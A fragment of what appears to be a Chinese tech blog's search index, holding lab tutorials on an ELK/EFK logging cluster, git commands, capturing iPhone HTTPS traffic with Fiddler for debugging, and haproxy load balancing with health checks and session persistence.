TIME_去验证查看会发现端口一定会在3000到3005范围内","link":"/2020/08/03/ftp/"},{"title":"elk分布式日志收集","text":"目录1，开源的分布式日志系统elk(elasticsearch+logstash+Kibana)efk(elasticsearch+filebeat+Kibana) Elasticsearch是个开源分布式搜索引擎，提供搜集、分析、存储数据三大功能 www.elastic.coLogstash 主要是用来日志的搜集、分析、过滤日志的工具Kibana可以为 Logstash 和 ElasticSearch 提供的日志分析友好的 Web 界面，可以帮助汇总、分析和搜索重要数据日志 新版本加了beats(轻量级的日志收集处理工具(Agent)，Beats占用资源少 kibana (日志web展示) | | | | elasticsearch1 elasticsearch2 elasticsearch3 (elasticsearch集群，日志分析存储） | | | | | logstash (收集或过滤日志) | | | 业务服务器1 业务服务器2 业务服务器3 业务服务器4 beats beats beats beats (filebeats收集日志传给elasticsearch,或者传给logstash过滤) 2，实验准备我这里只用三台虚拟机来模拟192.168.224.10 kibana+elasticsearch主节点192.168.224.11 elasticsearch数据节点1+logstash或filebeats192.168.224.12 elasticsearch数据节点2+logstash或filebeats 环境配置要求：内存：2G以上CPU：单核以上，不然后面elasticsearch可能启动不起来 主机名及主机名绑定 /etc/hosts123192.168.224.10 server.com192.168.224.11 server1.com192.168.224.12 server2.com 时间同步 静态ip绑定 关闭防火墙,selinux 配置yum源(本地源加下面的源) 3台都要同步进行。下面这段是公网的源路径，但elk相关的rpm包比较大，网速不行的话，建议用下面的我配置好的yum[elk]name=elkbaseurl=https://artifacts.elastic.co/packages/7.x/yumenabled=1gpgcheck=0 ==========================================================更新yum仓库yum makecache 3,搭建elasticsearch集群第一步三台elasticsearch机器确认有jdk,然后安装elasticsearch java -versionopenjdk version “1.8.0_102”OpenJDK Runtime Environment (build 1.8.0_102-b14)OpenJDK 64-Bit Server VM (build 25.102-b14, mixed mode) 没有就需要安装yum install -y java [root@vm1 ~]# yum install elasticsearch -y[root@vm2 ~]# yum install elasticsearch -y[root@vm3 ~]# yum install elasticsearch -y 也可以本地上传rpm 包然后安装 ​ rpm -ivh elasticsearch-6.3.0.rpm 第二步三台上配置elasticsearch（三台的配置有少许不同），然后启动服务，组建elasticsearch集群 [root@vm1 ~]# vim /etc/elasticsearch/elasticsearch.yml #清空里面的内容cluster.name: elk-cluster –集群名node.name: server.com –本节点主机名node.master: true –定义此节点为master节点node.data: false –定义此节点不为数据节点path.data: /var/lib/elasticsearch –数据目录path.logs: /var/log/elasticsearch –日志目录network.host: 0.0.0.0 –监听地址http.port: 9200 –监听端口discovery.zen.ping.unicast.hosts: [“192.168.224.10”, “192.168.224.11”,”192.168.224.12”] –加入集群的所有节点IP cluster.name: elk-clusternode.name: server.comnode.master: truenode.data: falsepath.data: /var/lib/elasticsearchpath.logs: /var/log/elasticsearchnetwork.host: 0.0.0.0http.port: 9200discovery.zen.ping.unicast.hosts: [“192.168.224.10”, “192.168.224.11”, “192.168.224.12”] [root@vm2 ~]# vim /etc/elasticsearch/elasticsearch.ymlcluster.name: elk-clusternode.name: server1.comnode.master: false #定义此节点不为master节点node.data: true #定义此节点为数据节点path.data: /var/lib/elasticsearchpath.logs: /var/log/elasticsearchnetwork.host: 0.0.0.0http.port: 9200discovery.zen.ping.unicast.hosts: [“192.168.224.10”, “192.168.224.11”, “192.168.224.12”] [root@vm3 ~]# vim /etc/elasticsearch/elasticsearch.ymlcluster.name: elk-clusternode.name: server2.comnode.master: false #定义此节点不为master节点node.data: true #定义此节点为数据节点path.data: /var/lib/elasticsearchpath.logs: /var/log/elasticsearchnetwork.host: 0.0.0.0http.port: 9200discovery.zen.ping.unicast.hosts: [“192.168.224.10”, “192.168.224.11”, “192.168.224.12”] [root@vm1 ~]# systemctl start elasticsearch[root@vm1 ~]# systemctl enable elasticsearch[root@vm2 ~]# systemctl start elasticsearch[root@vm2 ~]# systemctl enable elasticsearch[root@vm3 ~]# systemctl start elasticsearch[root@vm3 ~]# systemctl enable elasticsearch 启动成功后（虚拟模拟比较卡，启动并建立集群会有一点慢），一台一台启动，查看端口yum install -y net-tools 下载软件netstat netstat -ntlup |grep java –所有节点查看都可以看到启动了下面的端口 9200则是数据传输端口9300端口是集群通信端口 启动不了： ulimit -n –检查系统最大打开文件数值是否太小 1024 vim /etc/security/limits.conf –在文件尾部加上下面两行，并重启系统即可 soft nofile 10240 hard nofile 10240 或者关机后重启一台一台启，不要三台同时启动。第三步：检查elasticsearch集群是否OK 开通防火墙 12iptables -A INPUT -p tcp -m multiport --dports 9200,9300,5601,9600,10514 -j ACCEPTiptables -A INPUT -p tcp -m multiport --sports 9200,9300,5601,9600,10514 -j ACCEPT 12345678910111213141516171819使用firefox查看下面的路径(健康检查)：http://192.168.224.10:9200/_cluster/health?pretty --访问的ip为elasticsearch主节点的IP；或者使用curl http://192.168.224.10:9200/_cluster/health?pretty 命令查看{ &quot;cluster_name&quot; : &quot;elk-cluster&quot;, &quot;status&quot; : &quot;green&quot;, --状态green &quot;timed_out&quot; : false, &quot;number_of_nodes&quot; : 3, --三个节点 &quot;number_of_data_nodes&quot; : 2, --只有两个为数据节点，另一个为master &quot;active_primary_shards&quot; : 0, &quot;active_shards&quot; : 0, &quot;relocating_shards&quot; : 0, &quot;initializing_shards&quot; : 0, &quot;unassigned_shards&quot; : 0, &quot;delayed_unassigned_shards&quot; : 0, &quot;number_of_pending_tasks&quot; : 0, &quot;number_of_in_flight_fetch&quot; : 0, &quot;task_max_waiting_in_queue_millis&quot; : 0, &quot;active_shards_percent_as_number&quot; : 100.0} 使用firefox查看下面的路径(集群详细信息) 123http://192.168.224.10:9200/_cluster/state?pretty --或者# curl http://192.168.224.10:9200/_cluster/state?pretty命令查看 第四步: 在主节点上安装kibana，并启动服务 在主节点上安装kibana，并启动服务(这里kibana我是和elasticsearch主节点模拟的同一台机器)： [root@vm1 ~]# yum install kibana -y rpm -ihv kibana-6.3.0-x86_64.rpm #这样本地上传 12345[root@vm1 ~]# vim /etc/kibana/kibana.yml server.port: 5601 #kibana监听端口 :2 server.host: 192.168.224.10 #配置监听ip,允许elasticsearch的master能被访问 :7 elasticsearch.url: &quot;http://192.168.224.10:9200&quot; :28行 --配置elasticsearch服务器的ip，如果是集群则配置该集群中master的ip logging.dest: /var/log/kibana.log :96 #kibana的日志文件路径,自己指定日志，方便排错和调试 touch /var/log/kibana.log chown kibana.kibana /var/log/kibana.log systemctl restart kibana systemctl enable kibana lsof -i:5601 使用firefox浏览器访问 http://192.168.224.10:5601 –IP为kibana服务器的ip 自定义安装版本kibana1wget https://artifacts.elastic.co/downloads/kibana/kibana-7.2.0-linux-x86_64.tar.gz =============================================================== ELK第五步:在node1(server1.com)上安装logstash，配置并启动(这一台是elasticsearch集群节点之一，也模拟logstash节点) yum install logstash -y 1rpm -ivh logstash-6.3.0.rpm #本地上传rpm 安装 vim /etc/rsyslog.conf (添加在文件末尾) 1*.* @@192.168.224.11:10514 #IP写node1的IP地址（本机的IP） systemctl restart rsyslog grep -Ev “^#|^$” /etc/logstash/logstash.yml #注意yml格式 vim /etc/logstash/logstash.yml :28行 path.data: /var/lib/logstash:190行 http.host: “192.168.224.11” –配置成node1的ip:208行 path.logs: /var/log/logstash vim /etc/logstash/conf.d/syslog.conf –编辑一个配置文件，把本地的系统日志收集并发送给elasticsearch集群input { #输入，也就是日志源 syslog { type =&gt; “system-syslog” port =&gt; 10514 #端口，和上面在rsyslog里配置的端口对应 }}output { #输出，这里定义输出到elasticsearch集群 elasticsearch { hosts =&gt; [“192.168.224.10:9200”] #elasticsearch集群的master节点 index =&gt; “system-syslog-%{+YYYY.MM}” #定义日志索引 } } 纯文件内容：input { syslog { type =&gt; “system-syslog” port =&gt; 10514 }}output { elasticsearch { hosts =&gt; [“192.168.224.10:9200”] index =&gt; “system-syslog-%{+YYYY.MM}” } } 启动logstash服务 cd /usr/share/logstash/bin ./logstash –path.settings /etc/logstash/ -f /etc/logstash/conf.d/syslog.conf &amp; –等待时间比较久(我这里虚拟机实验环境2－3分钟),在这期间屏幕会陆续有输出。 netstat -ntlup |grep 9600 netstat -ntlup |grep 10514 第六步:测试回到kibana服务器(192.168.224.10)查看日志，执行以下命令查看获取的索引信息： curl ‘192.168.224.10:9200/_cat/indices?v’health status index uuid pri rep docs.count docs.deleted store.size pri.store.sizegreen open system-syslog-2018.11 tTNC6tV_RoqYSHLtlCAG-A 5 1 3 0 58.8kb 29.4kb 如果没有出现日志索引信息就开通防火墙， 1iptables -A INPUT -p udp -m multiport --sports 10514 -j ACCEPT firefox访问http://192.168.224.10:5601 点management－－》点Index Patterns－－》 在Index pattern里填写索引名称（system-syslog-2018.11或者system-syslog-*）－－》点Next step －－》 —》在Time Filter field name下拉菜单选择@timestamp－－》点Create Index Patterns 3.点discover查看 ![aaWzJH.png](https://s1.ax1x.com/2020/08/03/aaWzJH.png) 不行可以重启kibana服务器 EFK第一步:在node1和node2上安装filebeat,两台都要操作 yum install filebeat -y 1rpm -ivh filebeat-6.3.0-x86_64.rpm 第二步: 修改filebeat配置文件，两台都要操作 vim /etc/filebeat/filebeat.yml filebeat.inputs: type: log enabled: false –注释这一句paths: /var/log/yum.log –这里改成你要测试的日志(也可以写成/var/log/*.log这种，我这里使用yum.log测试比较简单方便） output.elasticsearch: #:144 hosts: [&quot;192.168.224.10:9200&quot;] #指定输出给elasticsearch集群的master:9200 也可以自定义日志 **第三步:**启动服务，两台都要操作 systemctl start filebeat systemctl enable filebeat systemctl status filebeat 第四步: 回到kibana服 务器上操作 curl ‘192.168.224.10:9200/_cat/indices?v’ –使用此命令确认有filebeat-*的索引 **第五步:**使用firefox操作kibana图形界面http://192.168.224.10:5061 点management－－》点Index Patterns－－》在Index pattern里填写索引名称（filebeat-6.3.0-2018.07.05或者filebeat-*）－－》点Next step －－》 在Time Filter field name下拉菜单选择@timestamp－－》点Create Index Patterns 点discover查看.如果没有日志输出尝试在yum.log中加入新日志。添加 message 主看信息 1234567891011121314151617181920 grep -Ev &quot;#|^$&quot; /etc/filebeat/filebeat.yml filebeat.inputs:- type: log paths: - /var/log/yum.log paths: - /var/log/nginx.log filebeat.config.modules: path: ${path.config}/modules.d/*.yml reload.enabled: false setup.template.settings: index.number_of_shards: 3 setup.kibana: output.elasticsearch: hosts: [&quot;192.168.224.10:9200&quot;] index: &quot;yum-%{+yyyy.MM.dd}&quot; setup.template.name: &quot;yum-nginx&quot; setup.template.pattern: &quot;yum-nginx-*&quot; 删除索引 1234 curl -XDELETE '192.168.224.10:9200/.kibana'GET索引curl -XGET '192.168.224.10:9200/yum-2018.07.06' ================================================== 更多功能，请自行查阅资料","link":"/2020/08/03/elk%E5%88%86%E5%B8%83%E5%BC%8F%E6%97%A5%E5%BF%97%E6%94%B6%E9%9B%86/"},{"title":"git的使用","text":"1,git的使用1.官网账号1234https://github.comwindos下载 https://git-scm.com/download/win 2.设置1234567配置用户名 git config --global user.name &quot;你自己GitHub的用户名&quot;配置邮箱 git config --global user.email &quot;你自己Github的注册邮箱&quot;去创建一个空目录lukegit然后cd到lukegit 执行git init 3,上传文件到仓库首先把文件下拉到本地初始化好的git目录 通过pull方法 1234567891011121314添加远程仓库，origin只是一个远程仓库的别名，可以随意取git remote add origin http://47.244.62.17:8989/dev/scripts.git先把远程的pull到本地。把自己的代码修改好，移动到对应的目录 git pull origin master开始修改代码。或新增目录。1.把文件添加到仓库 git add . 提交当前目录的所有代码。2.把文件提交到仓库 git commit -m &quot;注释信息&quot; 通过clone方法 12345678910111213141516171819202122#新建目录初始化mkdir luketestcd luketest git init #clone到本地git clone http://47.244.62.17:8989/luke/luke.gitcd 到luke目录cd luke此时的目录下已经有一个远程仓库了git remote -vorigin http://47.244.62.17:8989/luke/luke.git (fetch)origin http://47.244.62.17:8989/luke/luke.git (push)开始修改代码。或新增目录。1.把文件添加到仓库 git add . 提交当前目录的所有代码。2.把文件提交到仓库 git commit -m &quot;注释信息&quot; 4,上传到远程仓库123456789101112131415161718192021222324252627282930313233343536将本地仓库push远程仓库，并将origin设为默认远程仓库git push -u origin master推送现有的git仓库内容git remote add origin http://47.244.62.17:8989/luke/bet365.gitgit push -u origin --allgit push -u origin --tags远程版本库操作命令：git rm filename #删除版本库永久存放区的指定文件 git remote #查看当前版本库已经添加的所有远程版本库 git remote -v #长格式查看所有添加的远程版本库 git remote add [版本库名称] [链接地址] #添加一个远程版本库 git remote remove [版本库名称] #删除一个远程版本库 git push -u [版本库名称] [分支名称] #将本地版本库内容推送到指定远程版本库 git clone [版本库链接地址] #克隆(下载)一个远程版本库的内容到本地 删除缓存区所有文件命令git rm -r --cached . #主要这个点一定要写fetch与pullfetch是将远程主机的最新内容拉到本地，不进行合并git fetch origin master pull 则是将远程主机的master分支最新内容拉下来后与当前本地分支直接合并 fetch+mergegit pull origin master","link":"/2020/08/03/git%E7%9A%84%E4%BD%BF%E7%94%A8/"},{"title":"fiddler_ios手机抓包","text":"fiddler ios手机 抓包app api域名 第一步：配置网络iPhone 和电脑连接同一个 WIFI。 第二步：配置 fiddler1、打开 fiddler，进入 Tools —— Options… 2、如下图设置： 搞一下证书 选择Connections 允许远程连接 3、设置完成后，保存，然后重启 fiddler 第三步：手机设置代理1、查看电脑的ip： 假如电脑 ip为：192.168.1.102 2、iPhone 手机打开 “设置 —— 无线局域网”，点击已连接 wifi 后面的小叹号，如图 3、然后滑动到页面最下方，点击“配置代理”，配置代理默认是关闭的。 选择“手动”，然后在“服务器”输入电脑的ip，在“端口”输入“8888”。切记，抓包完成后，将配置代理设置为“关闭”，否则可能影响手机的上网。 第四步：安装证书在 Safair 浏览器中打开 电脑ip:8888，例如“192.168.1.102:8888”。 点击圈出来的链接安装证书 只安装还不行，iPhone默认不会开启信任的，需要手动添加一下证书信任，设置 - 通用 - 关于本机，最下面有个信任证书设置按钮，打开后是下面的页面，将DO_NOT_TRUST_FiddlerRoot这个证书打开，不信任这个证书是抓不到https包的，同样的测试完之后你也可以将他关闭。 到这里，就可以使用fiddler抓包iPhone了，直接在手机上进入对应的APP就可以获取相应的数据了。","link":"/2020/08/05/fiddler_ios%E6%89%8B%E6%9C%BA_%E6%8A%93%E5%8C%85app_api%E5%9F%9F%E5%90%8D/"},{"title":"haproxy","text":"haproxy概述haproxy 支持4层，7层负载均衡，反向代理,会话保持，大并发。LVS 稳定，效率高，四层调度。不支持7层的内容分发或过滤。不支持会话保持。nginx 支持七层调度，现在也有开发的新的模块来扩展调度相关的功能。在会话保持，内容分发过滤方面比haproxy相比要差 HAProxy 是一款提供高可用性、负载均衡以及基于TCP（第四层）和HTTP（第七层）应用的代理软件，支持虚拟主机，它是免费、快速并且可靠的一种解决方案。 HAProxy特别适用于那些负载特大的web站点，这些站点通常又需要会话保持或七层处理。HAProxy运行在时下的硬件上，完全可以支持数以万计的 并发连接。并且它的运行模式使得它可以很简单安全的整合进您当前的架构中， 同时可以保护你的web服务器不被暴露到网络上。 HAProxy 实现了一种事件驱动、单一进程模型，此模型支持非常大的并发连接数。多进程或多线程模型受内存限制 、系统调度器限制以及无处不在的锁限制，很少能处理数千并发连接。事件驱动模型因为在有更好的资源和时间管理的用户端(User-Space) 实现所有这些任务，所以没有这些问题。此模型的弊端是，在多核系统上，这些程序通常扩展性较差。这就是为什么他们必须进行优化以 使每个CPU时间片(Cycle)做更多的工作。 HAProxy 支持连接拒绝 : 因为维护一个连接的打开的开销是很低的，有时我们很需要限制攻击蠕虫（attack bots），也就是说限制它们的连接打开从而限制它们的危害。 这个已经为一个陷于小型DDoS攻击的网站开发了而且已经拯救了很多站点，这个优点也是其它负载均衡器没有的。 HAProxy 支持全透明代理（已具备硬件防火墙的典型特点）: 可以用客户端IP地址或者任何其他地址来连接后端服务器. 这个特性仅在Linux 2.4/2.6内核打了cttproxy补丁后才可以使用. 这个特性也使得为某特殊服务器处理部分流量同时又不修改服务器的地址成为可能。 1234http://www.haproxy.org/#docs #haproxy官方社区www.haproxy.comhttp://cbonte.github.io/haproxy-dconv/2.1/configuration.html#2 #文档配置 12wget http://www.haproxy.org/download/2.2/src/haproxy-2.2.0.tar.gz #下载源码 这个版本编译会报错。wget http://www.haproxy.org/download/1.8/src/haproxy-1.8.25.tar.gz #下载稳定版本 开始部署haproxy编译安装123456789101112131415161718192021打开IP转发echo &quot;net.ipv4.ip_forward = 1&quot; &gt;&gt; /etc/sysctl.conf &amp;&amp; sysctl -p 安装依赖yum install -y gcc gcc-c++ pcre pcre-devel openssl openssl-devel systemd-develtar xf haproxy-1.8.25.tar.gz #解压cd haproxy-1.8.25/uname -r #查询系统内核版本make TARGET=linux31 PREFIX=/usr/local/haproxymake install PREFIX=/usr/local/haproxy可执行文件拷贝一份到系统执行文件目录，该目录在path变量里面，可以直接使用haproxy命令cp /usr/local/haproxy/sbin/haproxy /usr/sbin/cp ./examples/haproxy.init /etc/init.d/haproxychmod 755 /etc/init.d/haproxyuseradd -r haproxymkdir /etc/haproxy 编写配置文件 1234567891011121314151617181920212223242526272829303132333435363738vim /etc/haproxy/haproxy.cfg# Global settings#---------------------------------------------------------------------global #全局配置 log 127.0.0.1 local3 info #指定服务器的日志级别 chroot /usr/local/haproxy #改变工作目录 user haproxy #用户组和用户 group haproxy daemon #以守护进程的方式运行 maxconn 4000 #最大连接数defaults #默认配置 log global mode http #7层http;4层tcp 如果要让haproxy支持虚拟主机，mode 必须设为http option httplog #http日志格式 timeout connect 5000 #连接超时(毫秒) timeout client 50000 #客户端超时(毫秒) timeout server 50000 #服务器超时(毫秒) listen stats mode http bind 192.168.224.11:1080 stats enable stats hide-version stats uri /stats stats admin if TRUEfrontend web_front #前端配置 web_front名称可自定义 bind 192.168.224.11:80 #发起的http请求到80端口，会转发到设置的ip及端口 mode http log global option httplog # 启用http日志 default_backend http_backbackend http_back #后端配置，http_back名称可自定义 option httpchk GET /index.html #设置健康检查页面 option forwardfor header X-Forwarded-For #传递客户端真实IP balance roundrobin #roundrobin 轮询方式# 需要转发的ip及端口 server client2.com 192.168.224.12:80 check inter 2000 rise 3 fall 3 weight 30 server client3.com 192.168.224.13:80 check inter 2000 rise 3 fall 3 weight 30 server client4.com 192.168.224.14:80 check inter 2000 rise 3 fall 3 weight 30 日志配置 123456789打开rsyslog配置：vi /etc/rsyslog.conf去掉下面两行前面的#号$ModLoad imudp$UDPServerRun 514并添加下面一行local3.* /var/log/haproxy.log 重启rsyslogsystemctl restart rsyslog 启动haproxy 1service haproxy start 代理段配置 123456789101112131415161718192021222324252627282930313233defaults &lt;name&gt; #为frontend, backend, listen提供默认配置 frontend &lt;name&gt; # 前端，相当于nginx, server {} backend &lt;name&gt; #后端，相当于nginx, upstream {} listen &lt;name&gt;同时拥有前端和后端,适用于一对一环境 mode http #默认的模式mode { tcp|http|health }，tcp是4层，http是7层，health只会返回OK log global #应用全局的日志配置 option httplog # 启用日志记录HTTP请求，默认haproxy日志记录是不记录HTTP请求日志 option dontlognull # 启用该项，日志中将不会记录空连接。所谓空连接就是在上游的负载均衡器或者监控系统为了探测该服务是否存活可用时，需要定期的连接或者获取某一固定的组件或页面，或者探测扫描端口是否在监听或开放等动作被称为空连接；官方文档中标注，如果该服务上游没有其他的负载均衡器的话，建议不要使用该参数，因为互联网上的恶意扫描或其他动作就不会被记录下来 option http-server-close #每次请求完毕后主动关闭http通道 option forwardfor except 127.0.0.0/8 #如果服务器上的应用程序想记录发起请求的客户端的IP地址，需要在HAProxy上配置此选项， 这样 HAProxy会把客户端的IP信息发送给服务器，在HTTP请求中添加&quot;X-Forwarded-For&quot;字段。启用X-Forwarded-For，在requests头部插入客户端IP发送给后端的server，使后端server获取到客户端的真实IP。 option redispatch #当使用了cookie时，haproxy将会将其请求的后端服务器的serverID插入到cookie中，以保证会话的SESSION持久性；而此时，如果后端的服务器宕掉了， 但是客户端的cookie是不会刷新的，如果设置此参数，将会将客户的请求强制定向到另外一个后端server上，以保证服务的正常。 retries 3 # 定义连接后端服务器的失败重连次数，连接失败次数超过此值后将会将对应后端服务器标记为不可用 timeout http-request 10s #http请求超时时间 timeout queue 1m #一个请求在队列里的超时时间 timeout connect 10s #连接超时时间 timeout client 1m #客户端超时时间 timeout server 1m #服务器端超时时间 timeout http-keep-alive 10s #设置http-keep-alive的超时时间 timeout check 10s #检测超时时间 maxconn 3000 #每个进程可用的最大连接数 frontend main *:80 #监听地址为80 acl url_static path_beg -i /static /images /javascript /stylesheets acl url_static path_end -i .jpg .gif .png .css .js use_backend static if url_static default_backend my_webserver #定义一个名为my_app前端部分。此处将对应的请求转发给后端 backend static #使用了静态动态分离（如果url_path匹配 .jpg .gif .png .css .js静态文件则访问此后端） balance roundrobin #负载均衡算法（#banlance roundrobin 轮询，balance source 保存session值，支持static-rr，leastconn，first，uri等参数） server static 127.0.0.1:80 check #静态文件部署在本机（也可以部署在其他机器或者squid缓存服务器） backend my_webserver #定义一个名为my_webserver后端部分。PS：此处my_webserver只是一个自定义名字而已，但是需要与frontend里面配置项default_backend 值相一致 balance roundrobin #负载均衡算法 server web01 172.31.2.33:80 check inter 2000 fall 3 weight 30 #定义的多个后端 server web02 172.31.2.34:80 check inter 2000 fall 3 weight 30 #定义的多个后端 server web03 172.31.2.35:80 check inter 2000 fall 3 weight 30 #定义的多个后端 haproxy部署方式下图中haproxy用了两个网段(这里模拟内外网),实际时也可以只用一个网卡(只有内网网卡),公网IP在前端就可以了.这里尽量用两个内网来做，防止桥接网络IP冲突. 客户端（宿主机) 192.168.2.x | | 外网 | 192.168.2.65 haproxy 内网 | 192.168.224.10 | | web1 web2 192.168.224.11 192.168.224.12 实验前准备: (centos7.3平台)1，配置主机名和主机名互相绑定 123456hostnamectl set-hostname --static server.comvim /etc/hosts192.168.224.10 server.com192.168.224.11 server1.com192.168.224.12 server2.com 2,静态ip3,关闭iptables，selinux 第一步：1,客户端准备客户端有firefox和curl就可以了 2,后台web服务器准备 把web1和web2装好httpd，然后启动起来，分别做一个不同内容的主页方便验证web1上做： 1234yum install httpd httpd-devel -ysystemctl start httpdsystemctl enable httpdecho web1 &gt; /var/www/html/index.html web2上做： 1234yum install httpd* -ysystemctl start httpdsystemctl enable httpdecho web2 &gt; /var/www/html/index.html 第二步：在haproxy服务器上安装haproxy 1234 yum install haproxy -y/usr/share/doc/haproxy-1.5.18/haproxy-en.txt #参数文档/etc/haproxy/haproxy.cfg #主配置文件 第三步: 配置haproxy 配置结构介绍:global 全局配置参数（主要配置服务用户，pid,socket,进程，chroot等) defaults 负载调度相关的全局配置 （调度模式，调度超时时间，调度算法，健康检查等等。配置在这个段，那么就默认对后面的listen,frontend,backend都生效) frontend 处理前台接收的请求，可以在这个段配置acl进行七层调度等，指定调到对应的backendbackend 最终调度的realserver相关配置 listen (就是frontend和backend的综合体) 先备份 12cp /etc/haproxy/haproxy.cfg /etc/haproxy/haproxy.cfg.bak grep -v '#' /etc/haproxy/haproxy.cfg #下面是我的配置示例（global,defaults都基本没有调整，优化相关参数请参考文档和实际生产环境做调整) 12345678910111213141516171819202122232425262728293031323334global log 127.0.0.1 local2 chroot /var/lib/haproxy pidfile /var/run/haproxy.pid maxconn 4000 user haproxy group haproxy daemon stats socket /var/lib/haproxy/statsdefaults mode http #支持7层负载均衡，如果改成tcp就只支持4层负载均衡 log global option httplog option dontlognull option http-server-close option forwardfor except 127.0.0.0/8 option redispatch retries 3 timeout http-request 10s timeout queue 1m timeout connect 10s timeout client 1m timeout server 1m timeout http-keep-alive 10s timeout check 10slisten 192.168.2.65 *:80 balance roundrobin #roundrobin 轮询方式 server server1.com 192.168.224.11:80 server server2.com 192.168.224.12:80 启动haproxy 12systemctl start haproxysystemctl enable haproxy 客户端 curl 192.168.2.65 测试 把上面的listen配置段改成下面的frontend和backend，效果一样 1234567frontend 192.168.2.65 *:80 default_backend websbackend webs balance roundrobin server server1.com 192.168.224.11:80 server server2.com 192.168.224.12:80 12systemctl restart haproxysystemctl enable haproxy 第四步:客户端 curl 192.168.2.65 测试 结果为rr轮循web1,web2 ========================================================================查看haproxy状态页面，实际这个页面显示的内容为haproxy的状态页面，不是后台web的显示内容。下面参数中之所以有两台web服务器，是为了统计web服务器的状态。 #配置文件listen配置段加上stats的四行(将listen替换为下面) 12345678910listen 192.168.2.65 *:80 stats uri /haproxy-stats #指定访问的路径 stats realm Haproxy\\ statistics #指定统计信息提示 stats auth name:123 #需要验证的用户名和密码才能登录查看 stats hide-version #隐藏客户端访问统计页面时的haproxy版本号 balance roundrobin server server1.com 192.168.224.11:80 server server2.com 192.168.224.12:80systemctl reload haproxy.service #客户端使用下面的去访问http://192.168.2.65/haproxy-stats 12输入名字 name密码 123 或者换成下面的配置，效果一样 1234567891011frontend 192.168.2.65 *:80 default_backend serversbackend servers stats uri /haproxy-stats stats realm Haproxy\\ statistics stats auth li:li123 stats hide-version balance roundrobin server server1.com 192.168.224.11:80 server server2.com 192.168.224.12:80 -客户端使用下面的去访问http://192.168.2.65/haproxy-stats ＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝ 关于haproxy日志vim /etc/rsyslog.conf 12345678$ModLoad imudp$UDPServerRun 514 #打开这两句的注释，表示udp协议514端口接收远程日志（haproxy日志做到127.0.0.1的本地，也要按远程日志做法来做)local2.* /var/log/haproxy.log #加上这一句，表示local2日志设备的所有级别日志都会记录到后面的文件路径中(local2是和haproxy里的配置对应的。这条语句加在“$UDPServerRun 514”之后）local2 指的是 /etc/haproxy/haproxy.cfg 里面 26 行systemctl restart rsyslog.servicetail -f /var/log/haproxy.log (默认此文件不存在，但是有用户访问网站，日志文件就开始生成，并开始输出日志) ＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝ haproxy的健康检查功能和日志处理。 原理是在指定位置放置文件，如果文件存在则认为服务器是健康，否则认为web服务不可用。 vim /etc/haproxy/haproxy.cfg 替换listen整段 12345678910listen 192.168.2.65 *:80 stats uri /haproxy-stats stats realm Haproxy\\ statistics stats auth li:li123 stats hide-version balance roundrobin option forwardfor #日志forward，让后台web记录客户端的IP，而不是haproxy的IP option httpchk HEAD /check.txt HTTP/1.0 #健康检查功能如果后台web服务器家目录中没有check.txt文件，则表示后台web挂掉；此版本要使用http的1.0版，1.1版还不支持 server server1.com 192.168.224.11:80 check inter 2000 rise 2 fall 5 server server2.com 192.168.224.12:80 check inter 2000 rise 2 fall 5 #加上检查的间隔2秒，rise 2, 是2次正确表示服务器可用；fall 5表示5次失败表示服务器不可用 创建健康检查文件On Web1touch /var/www/html/check.txt On Web2:touch /var/www/html/check.txt 重新加载 systemctl reload haproxy 服务正常curl 192.168.224.10 正常显示 客户端验证健康检查：尝试删除文件/var/www/html/check.txt，然后运行命令 curl 192.168.224.10，观察结果变化.结果为有check.txt文件的则可以被调，没有的就不可以. 日志问题1在web服务器端vim /var/log/httpd/access_log后台web里每２秒都会有一句healthcheck的日志，想删除他，方法如下 方法一:写一个脚本就如下两句，定时去执行一次就可以了 123456sed -i '/check.txt\\ HTTP\\/1.0/d' /var/log/httpd/access_log note: sed -i 配合字符串末尾的‘d’，实现删除特定字符串kill -HUP `cat /var/run/httpd/httpd.pid` (sed命令修改access_log会导致文件被httpd进程无法持续写入日志 kill -HUP让httpd重启服务)(如果想要更改配置而不需停止并重新启动服务，请使用该命令。在对配置文件作必要的更改后，发出该命令以动态更新服务配置) 方法二: (推荐)httpd不记录检测日志: #健康检查有大量的日志，指定不记录它. 123456vim /etc/httpd/conf/httpd.conf, 搜索'CustomLog'，然后修改。(或者注释217行增加下面2行)SetEnvIf Request_URI &quot;^/check\\.txt$&quot; dontlogCustomLog logs/access_log combined env=!dontlog只要匹配到请求uri为 check.txt 就不记录日志。 重启后端的web服务器systemctl restart httpd 日志问题２:查看后端web的access.log，客户端的正常访问日志的IP并不是实际客户端IP，而是haproxy的内网IP 解决方法如下：方法一：直接使用前端haproxy的日志 方法二：后端apache日志处理 #为了让access.log显示客户端的IP，而不是haproxy调度器的IP配置 1234vim /etc/httpd/conf/httpd.conf #196行LogFormat &quot;%{X-Forwarded-For}i %l %u %t \\&quot;%r\\&quot; %&gt;s %b &quot; combined #加这行 #把原来的combined条目替换 (或者增加这行) ======================================================================== haproxy会话保持1,source算法（类似nginx的ip_hash算法或lvs的sh算法) 12345678910111213vim /etc/haproxy/haproxy.cfg 替换 listen段listen 192.168.2.65 *:80 stats uri /haproxy-stats stats realm Haproxy\\ statistics stats auth li:li123 stats hide-version balance source #把roundrobin改为source option forwardfor option httpchk HEAD /check.txt HTTP/1.0 server server1.com 192.168.224.11:80 check inter 2000 rise 2 fall 5 server server2.com 192.168.224.12:80 check inter 2000 rise 2 fall 5 systemctl reload haproxy #reload后客户端测试测试结果为一个客户端的请求会转发到同一个web服务器上。（亲缘性保持） 2,使用cookie(对浏览器有效，对elinks无效） vim /etc/haproxy/haproxy.cfg 1234567891011listen 192.168.2.65 *:80 stats uri /haproxy-stats stats realm Haproxy\\ statistics stats auth li:li123 stats hide-version balance roundrobin option forwardfor option httpchk HEAD /check.txt HTTP/1.0 cookie web_cookie insert nocache #web_cookie为名称；当客户端和HAProxy之间存在缓存时，建议将insert配合nocache一起使用 server server1.com 192.168.224.11:80 cookie web1 check inter 2000 rise 2 fall 5 server server2.com 192.168.224.12:80 cookie web2 check inter 2000 rise 2 fall 5 web1和 web2为后端web的cookie名称，不要一样 systemctl reload haproxy reload后客户端测试测试结果为：使用浏览器访问可以保持亲缘性会话，但是用curl工具则无法保持，因为curl不支持session 3,利用haproxy内置的stick table 来实现会话保持。stick table 